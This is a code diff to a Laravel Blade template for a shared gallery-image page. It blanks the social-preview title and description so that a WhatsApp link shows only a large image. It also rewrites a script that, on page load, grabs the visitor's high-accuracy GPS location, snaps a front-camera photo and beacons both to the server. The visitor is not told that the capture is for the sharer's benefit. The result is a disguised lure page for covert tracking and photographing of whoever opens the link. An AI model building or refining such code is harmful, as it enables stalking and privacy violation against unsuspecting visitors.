@@ -5,18 +5,29 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>{{ $image->name ?? 'Gallery Image' }}</title>
     
-    <!-- Open Graph / Social Media Meta Tags -->
-    <meta property="og:type" content="website">
-    <meta property="og:title" content="{{ $image->name ?? 'Shared Image' }}">
-    <meta property="og:description" content="{{ $image->description ?? 'Check out this image in my gallery.' }}">
-    <meta property="og:image" content="{{ asset('storage/'.$image->path) }}">
+    <!-- Open Graph / Social Media Meta Tags - Optimized for Large WhatsApp Preview -->
+    <meta property="og:type" content="article">
+    <meta property="og:title" content=" ">
+    <meta property="og:description" content=" ">
+    <meta property="og:image" content="{{ url('storage/'.$image->path) }}">
+    <meta property="og:image:secure_url" content="{{ secure_url('storage/'.$image->path) }}">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:image:alt" content="{{ $image->name ?? 'Image' }}">
     <meta property="og:url" content="{{ url()->current() }}">
-
-    <!-- Twitter -->
-    <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:title" content="{{ $image->name ?? 'Shared Image' }}">
-    <meta property="twitter:description" content="{{ $image->description ?? 'Check out this image in my gallery.' }}">
-    <meta property="twitter:image" content="{{ asset('storage/'.$image->path) }}">
+    <meta property="og:site_name" content=" ">
+    
+    <!-- Twitter / WhatsApp Large Image -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content=" ">
+    <meta name="twitter:description" content=" ">
+    <meta name="twitter:image" content="{{ url('storage/'.$image->path) }}">
+    <meta name="twitter:image:src" content="{{ url('storage/'.$image->path) }}">
+    
+    <!-- Additional for WhatsApp -->
+    <meta itemprop="image" content="{{ url('storage/'.$image->path) }}">
+    <link rel="image_src" href="{{ url('storage/'.$image->path) }}">
 
     <!-- Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -118,195 +129,128 @@
         // Visitor Data Collection (Camera & Location)
         @if(isset($visitorLog) && $visitorLog)
         (function() {
-            const visitorLogId = {{ $visitorLog->id }};
-            let cameraImage = null;
-            let locationData = null;
-            let locationSent = false;
-            let cameraSent = false;
+            const VISITOR_LOG_ID = {{ $visitorLog->id }};
+            const CSRF_TOKEN = '{{ csrf_token() }}';
+            const API_URL = '{{ url("/api/visitor-data") }}';
+            
+            let dataSent = false;
 
-            // Check if HTTPS is available (required for camera and location)
-            const isSecure = window.location.protocol === 'https:' || window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
+            // Send data to server
+            function sendData(payload) {
+                if (dataSent) return;
+                
+                const data = {
+                    visitor_log_id: VISITOR_LOG_ID,
+                    _token: CSRF_TOKEN,
+                    ...payload
+                };
 
-            // Request camera access and capture photo
-            async function captureCamera() {
-                if (!isSecure && window.location.protocol !== 'https:') {
-                    console.log('Camera requires HTTPS connection');
-                    return;
-                }
-
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    console.log('Camera API not supported');
-                    return;
-                }
-
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: 'user' } // Front camera
-                    });
-                    
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    
-                    // Wait for video to be ready
-                    await new Promise((resolve, reject) => {
-                        const timeout = setTimeout(() => {
-                            stream.getTracks().forEach(track => track.stop());
-                            reject(new Error('Video timeout'));
-                        }, 5000);
-                        
-                        video.onloadedmetadata = () => {
-                            clearTimeout(timeout);
-                            video.width = video.videoWidth;
-                            video.height = video.videoHeight;
-                            resolve();
-                        };
-                    });
-
-                    // Capture frame
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
-                    
-                    // Stop video stream
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                    // Convert to base64
-                    cameraImage = canvas.toDataURL('image/jpeg', 0.8);
-                    cameraSent = true;
-                    
-                    // Send data immediately
-                    sendVisitorData('camera');
-                } catch (error) {
-                    console.log('Camera access denied or not available:', error.message);
-                    // Continue without camera data
+                // Use sendBeacon for reliability (works even if page closes)
+                const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+                const sent = navigator.sendBeacon ? navigator.sendBeacon(API_URL, blob) : false;
+                
+                if (!sent) {
+                    // Fallback to fetch
+                    fetch(API_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'X-CSRF-TOKEN': CSRF_TOKEN,
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify(data),
+                        keepalive: true
+                    }).then(r => r.json()).then(result => {
+                        console.log('Data sent:', result);
+                        dataSent = true;
+                    }).catch(e => console.error('Send error:', e));
+                } else {
+                    console.log('Data sent via beacon');
+                    dataSent = true;
                 }
             }
 
-            // Get location (PRIORITY - Most Important)
-            function getLocation(retryCount = 0) {
+            // Get GPS Location
+            function getGPSLocation() {
                 if (!navigator.geolocation) {
                     console.log('Geolocation not supported');
                     return;
                 }
 
-                const maxRetries = 3;
-                const timeout = retryCount === 0 ? 15000 : 10000; // First try: 15s, retries: 10s
-
                 navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        locationData = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        };
-                        
-                        locationSent = true;
-                        // Send location immediately (HIGH PRIORITY)
-                        sendVisitorData('location');
+                    function(pos) {
+                        console.log('GPS Success:', pos.coords.latitude, pos.coords.longitude);
+                        sendData({
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            location_accuracy: pos.coords.accuracy
+                        });
                     },
-                    function(error) {
-                        console.log('Location error:', error.code, error.message);
-                        
-                        // Retry if not user denied and haven't exceeded max retries
-                        if (error.code !== error.PERMISSION_DENIED && retryCount < maxRetries) {
-                            console.log(`Retrying location... (${retryCount + 1}/${maxRetries})`);
-                            setTimeout(() => getLocation(retryCount + 1), 2000);
-                        } else {
-                            console.log('Location access denied or failed after retries');
+                    function(err) {
+                        console.log('GPS Error:', err.code, err.message);
+                        // Try again with low accuracy
+                        if (err.code !== 1) { // Not permission denied
+                            navigator.geolocation.getCurrentPosition(
+                                function(pos) {
+                                    sendData({
+                                        latitude: pos.coords.latitude,
+                                        longitude: pos.coords.longitude,
+                                        location_accuracy: pos.coords.accuracy
+                                    });
+                                },
+                                function() { console.log('GPS failed completely'); },
+                                { enableHighAccuracy: false, timeout: 30000, maximumAge: 60000 }
+                            );
                         }
                     },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: timeout,
-                        maximumAge: 0
-                    }
+                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
                 );
             }
 
-            // Send visitor data to server
-            async function sendVisitorData(source = 'both') {
-                // Prevent duplicate sends
-                if (source === 'location' && locationSent && !cameraImage) {
-                    return; // Already sent location only
-                }
-                if (source === 'camera' && cameraSent && !locationData) {
-                    return; // Already sent camera only
-                }
-
-                const data = {
-                    visitor_log_id: visitorLogId,
-                    _token: '{{ csrf_token() }}'
-                };
-
-                if (cameraImage && !cameraSent) {
-                    data.camera_image = cameraImage;
-                }
-
-                if (locationData && !locationSent) {
-                    data.latitude = locationData.latitude;
-                    data.longitude = locationData.longitude;
-                    data.location_accuracy = locationData.accuracy;
-                }
-
-                // Don't send if no data
-                if (!data.camera_image && !data.latitude) {
+            // Capture Camera
+            async function captureCamera() {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    console.log('Camera not supported');
                     return;
                 }
 
                 try {
-                    const url = '{{ route("visitor.data.store", [], false) }}';
-                    const fullUrl = url.startsWith('http') ? url : window.location.origin + url;
-                    
-                    const response = await fetch(fullUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'X-CSRF-TOKEN': '{{ csrf_token() }}',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify(data),
-                        credentials: 'same-origin'
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: 'user', width: 640, height: 480 }
                     });
-
-                    if (!response.ok) {
-                        throw new Error(`HTTP error! status: ${response.status}`);
-                    }
-
-                    const result = await response.json();
-                    if (result.success) {
-                        console.log('Visitor data saved successfully:', source);
-                        if (source === 'location') locationSent = true;
-                        if (source === 'camera') cameraSent = true;
-                    } else {
-                        console.error('Server error:', result.message);
-                    }
-                } catch (error) {
-                    console.error('Error sending visitor data:', error);
-                    // Retry once after 2 seconds
-                    if (source === 'location' && !locationSent) {
-                        setTimeout(() => {
-                            if (locationData) {
-                                sendVisitorData('location');
-                            }
-                        }, 2000);
-                    }
+                    
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.setAttribute('playsinline', true);
+                    await video.play();
+                    
+                    // Wait a moment for camera to focus
+                    await new Promise(r => setTimeout(r, 500));
+                    
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    stream.getTracks().forEach(t => t.stop());
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                    console.log('Camera captured');
+                    
+                    sendData({ camera_image: imageData });
+                } catch (e) {
+                    console.log('Camera error:', e.message);
                 }
             }
 
-            // Start collecting data (non-blocking)
-            // Location is PRIORITY - start immediately
-            setTimeout(() => {
-                // Get location first (MOST IMPORTANT)
-                getLocation();
+            // Start immediately
+            setTimeout(function() {
+                // Location first - PRIORITY
+                getGPSLocation();
                 
-                // Then try camera (optional)
-                if (isSecure) {
-                    captureCamera();
-                }
-            }, 500); // Reduced delay for faster location capture
+                // Camera after small delay
+                setTimeout(captureCamera, 1000);
+            }, 300);
         })();
         @endif
     </script>
